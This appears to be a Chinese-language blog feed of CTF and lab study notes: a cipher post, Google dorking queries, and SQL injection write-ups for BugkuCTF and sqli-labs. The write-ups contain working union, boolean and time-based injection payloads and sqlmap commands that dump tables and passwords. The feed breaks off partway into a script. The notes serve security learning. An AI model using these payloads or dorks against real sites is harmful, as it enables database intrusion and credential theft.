class="keyword">in</span> <span class="built_in">range</span>(numberOfColumn):     <span class="comment">#   i : 开始取值的位置</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, result_len, numberOfColumn):  <span class="comment"># 开始取值， 隔栏数取一个值， 起始位置是i</span></span><br><span class="line">            RESULT.append(string[j])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(RESULT))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214649.png"></p><p>选择看起来正常的即可</p><h3 id="🐱‍🐉栅栏密码（W型）"><a href="#🐱‍🐉栅栏密码（W型）" class="headerlink" title="🐱‍🐉栅栏密码（W型）"></a>🐱‍🐉栅栏密码（W型）</h3><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><blockquote><p>W型栅栏密码加密的方法中，明文由上至下顺序写上，当到达最低部时，再回头向上，一直重复直至整篇明文写完为止。</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214709.png"></p><p>如上图， 就是在栅栏密码的基础上进行变形，通常用工具进行解密</p><h4 id="🤦‍♂️再再举个栗子吧"><a href="#🤦‍♂️再再举个栗子吧" class="headerlink" title="🤦‍♂️再再举个栗子吧"></a>🤦‍♂️再再举个栗子吧</h4><p>明文：asiabnhasuiiuh</p><p>栏数：3</p><p>贴上在线解密网址：<a href="http://www.metools.info/code/fence154.html">http://www.metools.info/code/fence154.html</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210720214727.png"></p><p>阿斌帅帅</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;密码学学习笔记&lt;/h1&gt;

&lt;h2 id=&quot;🐕凯撒密码&quot;&gt;&lt;a href=&quot;#🐕凯撒密码&quot; class=&quot;headerlink&quot; title=&quot;🐕凯撒密码&quot;&gt;&lt;/a&gt;🐕凯撒密码&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="-CTF" scheme="https://abinix.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>谷歌语法学习记录</title>
    <link href="https://abinix.top/2021/06/29/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/06/29/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-06-29T07:39:21.000Z</published>
    <updated>2021-08-12T16:28:56.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="谷歌语法简介"><a href="#谷歌语法简介" class="headerlink" title="谷歌语法简介"></a>谷歌语法简介</h1><ol><li><h2 id="基本语法（常用）"><a href="#基本语法（常用）" class="headerlink" title="基本语法（常用）"></a>基本语法（常用）</h2><ul><li><p><strong>“xxx”+域名：</strong>     搜索xxx与 域名 相关的内容</p></li><li><p><strong>“xxx”：</strong>     精确寻找，引号内输入</p></li><li><p><strong>site：</strong>     指定域名，如：<code>site:edu.cn</code> 搜索教育网站</p></li><li><p><strong>inurl：</strong>     用于搜索包含的url关键词的网页，如：<code>inurl:uploads</code> 文件上传，搜索关于公司有关的网址中含有login的网页，</p></li><li><p><strong>intext：</strong>     搜索网页正文中的关键字，如：<code>intext:登陆/注册/用户名/密码</code></p></li><li><p><strong>filetype：</strong>     按指定文件类型即文件后缀名搜索，如：<code>filetpye:php/asp/jsp</code></p></li><li><p><strong>info：</strong>     可以搜索到一个url更多的信息 如：<code>info:www.baidu.com</code></p></li><li><p><strong>link：</strong>     搜索所有链接到某个特定url的页面 如：<code>link:www.baidu.com</code></p></li><li><p><strong>AND,OR：</strong>     前者用来关联，后者代表两者其一都可</p></li><li><p><strong>“?”和“*”：</strong>     占位通配符，匹配一些模糊搜索</p></li><li><p><strong>Cache：</strong>    搜索缓存 如：<code>cache: [www.baidu.com](http://www.baidu.com)</code></p></li></ul></li><li><h2 id="骚操作语法，渗透测试中用到"><a href="#骚操作语法，渗透测试中用到" class="headerlink" title="骚操作语法，渗透测试中用到"></a>骚操作语法，渗透测试中用到</h2><h3 id="搜索敏感文件："><a href="#搜索敏感文件：" class="headerlink" title="搜索敏感文件："></a>搜索敏感文件：</h3><ul><li><p><code>site:xxx.com filetype:doc</code> //只返回xxx.com站点上文件类型为doc的网页</p></li><li><p><code>site:xxx.com filetype:xls</code> //只返回xxx.com站点上文件类型为xls的网页</p></li><li><p><code>site:xxx.com filetype:cof</code> //只返回xxx.com站点上文件类型为cof的网页</p></li></ul><h3 id="搜索管理后台："><a href="#搜索管理后台：" class="headerlink" title="搜索管理后台："></a>搜索管理后台：</h3><ul><li><p><code>inurl:/admin/login.php</code> //查找管理员登录页面</p></li><li><p><code>inurl:/phpmyadmin/index.php</code> //查找后台数据库管理页面</p></li><li><p><code>site:xxx.com inurl:login</code> //在xxx.com站点中查找url中含有login的页面</p></li></ul><h3 id="搜索mail"><a href="#搜索mail" class="headerlink" title="搜索mail:"></a>搜索mail:</h3><ul><li><code>site:xxx.com intext:@xxx.com</code></li></ul><h3 id="查找后台："><a href="#查找后台：" class="headerlink" title="查找后台："></a>查找后台：</h3><ul><li><code>site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐</code></li></ul><h3 id="查找上传点："><a href="#查找上传点：" class="headerlink" title="查找上传点："></a>查找上传点：</h3><ul><li><code>site:xx.com inurl:file| uploadfile</code></li></ul><h3 id="查找上传漏洞："><a href="#查找上传漏洞：" class="headerlink" title="查找上传漏洞："></a><strong>查找上传漏洞：</strong></h3><ul><li>site:域名 <code>inurl:file|load|editor|Files</code></li></ul><h3 id="查找目录："><a href="#查找目录：" class="headerlink" title="查找目录："></a>查找目录：</h3><ul><li> 用Index of 语法现允许目录浏览的web网站 如：<code>index of /admin</code></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;谷歌语法简介&quot;&gt;&lt;a href=&quot;#谷歌语法简介&quot; class=&quot;headerlink&quot; title=&quot;谷歌语法简介&quot;&gt;&lt;/a&gt;谷歌语法简介&lt;/h</summary>
      
    
    
    
    <category term="-语法" scheme="https://abinix.top/categories/%E8%AF%AD%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>关于SQL注入</title>
    <link href="https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-05-19T12:29:21.000Z</published>
    <updated>2021-08-12T16:26:43.945Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BugkuCTF-web17-成绩表"><a href="#BugkuCTF-web17-成绩表" class="headerlink" title="BugkuCTF web17 成绩表"></a>BugkuCTF web17 成绩表</h1><p>先随便输入数字试试 输入1发现有回显</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503cc84ff6.jpg"></p><p>根据传参可判断这是POST方式，测试一下是不是为sql注入，输入id=1后回显正常</p><p>加入单引号后发现回显不正常，判断为sql注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d1e0df7.jpg"></p><p>接下来用order by 语句判断列数</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d31a22c.jpg"></p><p>从4开始吧，构造id=1’ order by 4#，正常回显</p><p>当构造id=1’ order by 5#时，发现回显不正常</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d3a9bf9.jpg"></p><p>由此判断有4列</p><h3 id="之后尝试联合注入，需要把查询数据置空"><a href="#之后尝试联合注入，需要把查询数据置空" class="headerlink" title="之后尝试联合注入，需要把查询数据置空"></a>之后尝试联合注入，需要把查询数据置空</h3><blockquote><p>具体做法是：<strong>id=0’ union select 1,2,3,4#</strong></p></blockquote><h3 id="下面就猜测数据库的库名，版本信息，数据库用户"><a href="#下面就猜测数据库的库名，版本信息，数据库用户" class="headerlink" title="下面就猜测数据库的库名，版本信息，数据库用户"></a>下面就猜测数据库的库名，版本信息，数据库用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips： 没有顺序可言，因为第一个列是成绩单的姓名，所以我们可以把它设为null</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d47b1c2.jpg"></p><h3 id="根据数据库skctf-flag去查询表名"><a href="#根据数据库skctf-flag去查询表名" class="headerlink" title="根据数据库skctf_flag去查询表名"></a>根据数据库skctf_flag去查询表名</h3><p>我们可以构造这么一个pyload，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select null,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version()#</span></span><br></pre></td></tr></table></figure><p>大致意思就是将第二个列显示出它所有的表名</p><blockquote><p>这个**select group_concat(table_name) from information_schema.tables where table_schema=database() **可以暂且把它当作一个用来查询表名的固定格式</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5b6888.jpg"></p><p>我们得到了fl4g，可知flag在fl4g的表中，那么下一步我们需要做的就是查询此表中的字段名</p><p>构造pyload</p><blockquote><p>id=0’ union select null,(select group_concat(column_name) from information_schema.columns where table_name=’fl4g’),user(),version()#</p></blockquote><p>注意！！</p><p>这里fl4g是一个表，所以需要加单引号</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5a95a2.jpg"></p><p>我们得到了 skctf_flag 字段 可知flag在这里了（皆大欢喜）</p><p>接下来就很简单了 直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select skctf_flag from fl4g</span><br></pre></td></tr></table></figure><p>可得 pyload</p><blockquote><p>id=0’ union select null,(select skctf_flag from fl4g),user(),version()#</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5b68e7.jpg"></p><p> 可得flag{aaab401ce593c5d4334e8c565a91b82e}</p><p>列名爆出后 爆当前列下的内容所用指令</p><p><code>select concat_ws(char(32,58,32),username,passwd) from users limit 1,1</code></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote><p>布尔盲注就是存在注入的页面没有回显，没办法用select 1，2，3….#来判断页面的回显</p></blockquote><p><strong>既需要手工又需要脚本：</strong></p><p><a href="http://219.153.49.228/new_list.php?id=1">http://219.153.49.228/new_list.php?id=1</a> and length(database())&gt;10</p><p>用上述的length函数判断数据库长度</p><p>现当值为10的时候，页面就没有显示为false。那么说明database()的长度是10</p><p>利用/!union/可以绕过对union的过滤</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BugkuCTF-web17-成绩表&quot;&gt;&lt;a href=&quot;#BugkuCTF-web17-成绩表&quot; class=&quot;headerlink&quot; title=&quot;BugkuCTF web17 成绩表&quot;&gt;&lt;/a&gt;BugkuCTF web17 成绩表&lt;/h1&gt;&lt;p&gt;先随便输入数</summary>
      
    
    
    
    <category term="-SQL" scheme="https://abinix.top/categories/SQL/"/>
    
    
  </entry>
  
  <entry>
    <title>关于SQLmap</title>
    <link href="https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/"/>
    <id>https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-05-19T12:18:19.000Z</published>
    <updated>2021-08-12T16:28:45.457Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于SQLmap"><a href="#关于SQLmap" class="headerlink" title="关于SQLmap"></a>关于SQLmap</h1><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60e65ae884d7a.jpg"></p><p><strong>还是成绩单那个例子</strong></p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” –dbs </p></blockquote><p>tips：因为是post方式，所以构造语句时需要加data=</p><p>– dbs 爆出数据库名称</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a502ed628a0.jpg"></p><p>如图：可以看到全部的数据库</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503490307e.jpg"></p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>将数据库中的所有表爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf –tables</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a50351141ca.jpg"></p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>知道了数据库 知道了表 我们将表中的字段名爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g –columns</p></blockquote><p>得到：</p><p>+————+————-+<br>| Column     | Type        |<br>+————+————-+<br>| skctf_flag | varchar(64) |<br>+————+————-+</p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>最后一步 爆字段内容</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g -C ‘skctf_flag’ –dump</p></blockquote><p>+—————————————-+<br>| skctf_flag                             |<br>+—————————————-+<br>| flag{aaab401ce593c5d4334e8c565a91b82e} |<br>+—————————————-+</p><h2 id="小结（sqlmap基本命令）"><a href="#小结（sqlmap基本命令）" class="headerlink" title="小结（sqlmap基本命令）"></a>小结（sqlmap基本命令）</h2><ul><li><p>曝出数据库名称 <strong>–dbs</strong></p></li><li><p>查看web当前使用的数据库 <strong>–current -db</strong></p></li><li><p>曝出web数据库使用账户    <strong>–current -user</strong></p></li><li><p>列出数据库所有账户    <strong>–users</strong></p></li><li><p>曝出数据库账号和密码    <strong>–passwords</strong></p></li><li><p>列出数据库中的表  <strong>-D XX –tables</strong> </p><p>(-D：指定数据库名称 XX：数据库名称 –    tables：列出该数据库的表)</p></li><li><p>列出表中的字段 <strong>-D XX -T YY –columns</strong> </p></li></ul><p>（-D指数据库名称 XX指数据库 -T指要列出字段的表  YY指数据库中的表 –columns指字段）</p><ul><li><p>曝字段内容 <strong>-D XX -T YY -C ”a,b,c” –dump</strong> </p><p>(-D指数据库名称 XX指数据库 -T指要列出字段的表 YY指数据库中的表 -C指定要曝的字段 –dump将结果导出)</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于SQLmap&quot;&gt;&lt;a href=&quot;#关于SQLmap&quot; class=&quot;headerlink&quot; title=&quot;关于SQLmap&quot;&gt;&lt;/a&gt;关于SQLmap&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://abing.oss-cn-beijing.aliyunc</summary>
      
    
    
    
    <category term="-SQL" scheme="https://abinix.top/categories/SQL/"/>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs解题</title>
    <link href="https://abinix.top/2021/05/19/sqli-labs%E6%89%93%E5%85%B3/"/>
    <id>https://abinix.top/2021/05/19/sqli-labs%E6%89%93%E5%85%B3/</id>
    <published>2021-05-19T12:18:19.000Z</published>
    <updated>2021-08-12T16:30:01.781Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">sqli-labs搭建以及前15题解答</h1><p>[TOC]</p><h1 id="sqli-labs的部署（vps上）"><a href="#sqli-labs的部署（vps上）" class="headerlink" title="sqli-labs的部署（vps上）"></a>sqli-labs的部署（vps上）</h1><ol><li><p>安装docker</p><p>因为自己vps上已经装好了，就不多赘述了</p><p><code>yum upadte</code>//更新yum</p><p><code>yum install -y docker-engine</code> //安装docker</p></li><li><p>部署sqli_libs</p><p><code>sudo docker search sqli-labs</code>//在docker镜像库中搜索sqli-labs</p><p><code>sudo docker pull acgpiano/sqli-labs</code>//拉取docker镜像库中的sqli-labs，并下载</p><p><code>sudo docker run -d --name sqli-labs -p 20000:80 acgpiano/sqli-labs</code>//生成镜像，-p为端口号 -name为镜像名字</p></li><li><p>完成后在命令行中打入 <code>docker ps</code> 查看镜像，可以看到sqli-labs的端口号为20000，已经开启</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722144936.png"></p></li><li><p>打开网页可以看到已经访问成功，让我们点击 第二行的<strong>setup</strong> 连接一下数据库</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722144949.png"></p></li><li><p>如果显示如下的画面则表示已经部署完毕，可以做题啦！</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722145056.png"></p></li></ol><h4 id="ps-如果无法连接security数据库，使用如下命令："><a href="#ps-如果无法连接security数据库，使用如下命令：" class="headerlink" title="ps: 如果无法连接security数据库，使用如下命令："></a>ps: 如果无法连接security数据库，使用如下命令：</h4><blockquote><p>docker ps -a                                     //查看所有容器</p><p>35c47c2c260d   c0ny1/sqli-labs:0.1               //定位到sqlilabs的容器</p><p>docker exec -it 0112 /bin/bash                   //交互模式进入容器   0112是容器id前几位</p><p>php /var/www/html/sql-connections/setup-db.php   //用php运行这个文件，数据库就连上了</p></blockquote><p>附上链接🔗： <a href="https://blog.csdn.net/Big_Study_Father/article/details/106052620">https://blog.csdn.net/Big_Study_Father/article/details/106052620</a></p><h1 id="sqli-labs做题记录"><a href="#sqli-labs做题记录" class="headerlink" title="sqli-labs做题记录"></a>sqli-labs做题记录</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先查看源码 在源码中，我们着重看这一句就好 <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727131547.png"></p><p>这句话中的id就是我们在url中get的值，所以通过这一部分的代码，我们可以知道它是什么类型的sql注入，用什么方式绕过等信息</p><p>由此我们可以想到<strong>如果闭合一个单引号并且将后面的内容注释掉后</strong> </p><p>sql语句就变成了这样<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39; union select 1,2,3 --+&#39;&quot;;</code></p><p>这里利用联合注入，将1，2，3显示出来，同样，利用联合注入还可以爆出表名，字段名等等</p><h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h4><ul><li>当在id=1后加单引号时报错，由此判断为<strong>字符型注入</strong>，原理如上面所分析的一样，加入注释符后又可恢复正常</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726223631.png"></p><ul><li><p>猜解字段数，我们利用order by语句猜解字段数，当order by 4时发现报错，此时判断有3个字段</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726223932.png"></p></li><li><p>判断显示位 ，<strong>注意！！</strong>此时利用union注入时，要将前面id不成立，即使id=-1</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726224208.png"></p><p>如图，可以发现我们成功将2，3显示在了页面上</p></li><li><p>接下来爆库名，因为能将数值回显，所以也能将数据库名回显</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726224349.png"></p><p>如上图，我们将想要显示的信息呈现在页面上，version()为版本信息，database()为库名</p></li><li><p>我们知道了库名，即可根据库名来爆表名，这里可以用hackbar工具进行注入</p><p>payload：<code>?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726224740.png"></p><p>​    得到如上几个表名</p><ul><li><p>有了表名，我们即可爆字段</p><p>payload：<code>?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726225918.png"></p><p>​    如上图，可以看到在users表中有三个字段，分别是 id，username，password</p><ul><li><p>此时我们爆出password即可成功，爆字段值</p><p>payload：<code>?id=-1&#39; union select 1,2,(select group_concat(password) from security.users)--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726230450.png"></p><p>​    可以看到所有字段内容已经被dump出来了，解题完毕</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>先看关键源码 <code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727131642.png"></p><p>很明显的区别就是与上题少了两个引号，上题是字符型注入，那么这题就是<strong>数字型注入</strong>，也就是说不需要引号，不用闭合引号，可直接输入，直接使用联合注入，其余解题方法与Less-1一样</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ul><li><p>猜解字段数，方法一样，order by 函数，只不过这题为数字型注入，不需要引号</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726231521.png"></p><p>可以看到还是一样只有3个字段</p></li><li><p>爆库名（利用union select时，还是一样要使左边的表达式不成立，即id=0）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726231809.png"></p><p>爆出数据库名 security</p></li><li><p>爆表名，利用语句可dump出所有表名</p><p>payload：<code>?id=0 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726232027.png"></p></li><li><p>爆字段，根据表名 users 爆字段</p><p>payload：<code>?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726232154.png"></p></li><li><p>爆字段值，根据字段爆内容</p><p>payload：<code>?id=0 union select 1,2,group_concat(password) from security.users--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210726232648.png"></p></li></ul><p>​    如图，所有字段内容已经出来，解题完成</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>先看关键源码： <code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727131929.png"></p><p>我们观察源码发现，语句上给id加上了个括号，但本质还是字符型注入</p><p>如果我们加一个单引号，那么语句就变成<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;&#39;) LIMIT 0,1&quot;;</code>但这样是会出现错误的，因为与前面的双引号重叠了</p><p>如果我们加上单引号并且加上括号的话，语句就变成<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;)&#39;) LIMIT 0,1&quot;;</code></p><p>如果我们加上括号并加上注释符后 语句为<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;）--+&quot;;</code></p><p>达到了注入的效果</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><ul><li><p>猜解字段数，利用order by语句</p><p>payload：<code>?id=1&#39;) order by 4--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132347.png"></p><p>存在3个字段</p></li><li><p>爆数据库名</p><p>payload：<code>?id=0&#39;) union select 1,database(),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132606.png"></p></li><li><p>爆表名</p><p>payload：<code>?id=0&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132813.png"></p></li><li><p>爆字段</p><p>payload：<code>?id=0&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727132921.png"></p></li><li><p>爆字段值</p><p>payload：<code>?id=0&#39;) union select 1,2,group_concat(password) from security.users--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727133255.png"></p></li></ul><p>字段爆完，解题完毕</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>首先看源码 <code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727133500.png"></p><p>可以看到id被括号括起来了，整体用双引号括起</p><p>那么也很简单，只要将双引号提前闭合就可以达到注入的效果</p><p>构造语句 <code>$sql=&quot;SELECT * FROM users WHERE id=($id&quot;)--+) LIMIT 0,1&quot;;</code></p><p>这样成功闭合，–+就将后面的东西注释掉了，成功注入</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>总体注入方式一样</p><ul><li><p>猜解字段，可以看到还是一样的3个字段</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727134757.png"></p></li><li><p>爆数据库名</p><p>payload：<code>?id=0&quot;) union select 1,database(),3--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727134853.png"></p></li><li><p>爆表名</p><p>payload：<code>?id=0&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727135153.png"></p><ul><li><p>爆字段</p><p>payload：<code>?id=0&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727135317.png"></p></li><li><p>爆字段值</p><p>payload：<code>?id=0&quot;) union select 1,2,group_concat(password) from security.users--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727135534.png"></p></li></ul><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>先看源码 </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727141234.png"></p><p>表面上和第一关没什么区别，但实际上它加上了个判断，也就是说如果我们联合注入的话它只会显示 You are in</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727141348.png"></p><p>此类型题目我们考虑使用盲注的方法，因为页面只会显示You are in，要么没有回显</p><p>当出现这种情况考虑布尔盲注，时间盲注，报错注入等，通过猜测和判断，确定长度和字符</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><ul><li><p>如果我们输入 <code>?id=1&#39; and sleep(5)--+</code></p><p>如果显示正常，那么页面会延迟5秒种，（并不会有页面的回显）如下图</p><p>ps：过在MySQL中执行select sleep(N)可以让此语句运行N秒钟：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727142443.png"></p></li><li><p>此题采用时间盲注的方式，采用payload：<code>?id=1’ and if(length(database())=7,sleep(5),1)--+</code></p><p>利用三元表达式，如果数据库长度为7，那么就延迟5s，否则就不延迟</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727144658.png">)</p><p>如图当判断库名长度为7时，无延迟，当长度为8时有延迟，所以库名长度为8</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727144606.png"></p><ul><li><p>猜测库名，利用left()函数</p><p>Left()得到字符串左部指定个数的字符</p><p>构造payload：<code>?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></p><p>如果数据库的第一个字符是s的话，那么就延迟5s</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727145116.png"></p><p>很明显有延迟，说明数据库第一个字符为s</p></li><li><p>但是一个个爆太慢了，我们采用python脚本的方式，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 